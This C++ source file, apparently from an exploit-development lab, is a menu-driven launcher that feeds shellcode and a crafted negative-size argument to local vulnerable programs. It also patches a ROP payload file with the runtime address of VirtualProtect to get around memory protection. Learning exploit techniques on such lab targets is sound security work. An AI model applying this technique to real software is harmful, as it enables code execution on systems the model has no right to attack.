// Exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <fstream>
#include <windows.h>
#include <stdio.h>

enum EXPLOIT
{
	kStackBufferOverflow = 1,
	kIntegerOverflow = 2,
	kROP = 3
};

void UpdateRopBin();

int main(int argc, char *argv[])
{
	std::cout << "Select an exploit" << std::endl;
	std::cout << "\t1. Stack buffer overflow" << std::endl;
	std::cout << "\t2. Integer overflow" << std::endl;
	std::cout << "\t3. ROP" << std::endl;

	int selection = 0;
	std::cin >> selection;

	char buffer[1024]{};

	if (selection == kStackBufferOverflow) {
		::sprintf_s(buffer, "StackOverflow.exe shellcode.bin");
	}
	else if (selection == kIntegerOverflow) {
		::sprintf_s(buffer, "IntegerOverflow.exe integeroverflow.bin -100");
	}
	else {
		UpdateRopBin();
		::sprintf_s(buffer, "ROP.exe ROP.bin");
	}

	STARTUPINFOA si{};
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi{};

	DWORD error{};
	if (!::CreateProcessA(nullptr, buffer, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
		DWORD error = GetLastError();
		std::cout << "Failed to create process, error " << error << std::endl;
		return -1;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return error;
}

// Write correct address of VirtualProtect in ROP.bin file
void UpdateRopBin()
{
	std::fstream fs;
	fs.open("ROP.bin", std::ios::binary | std::ios::in | std::ios::out);
	unsigned char c = 0;
	int offset = 0;

	// Look for the 1st non-Nop byte, and that signifies address of VirtualProtect
	while (fs) {
		fs >> c;
		//printf("%c ", c);
		if (c != 0x90) {
			// At this point offset contains offset of 1st non-Nop byte
			fs.seekg(offset);
			break;
		}
		offset++;
	}

	if (!fs) {
		std::cout << "Invalid ROP file" << std::endl;
	}
	else {
		FARPROC address = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
		fs.write((const char *)&address, sizeof(int *));
		fs.flush();
	}

	fs.close();
}
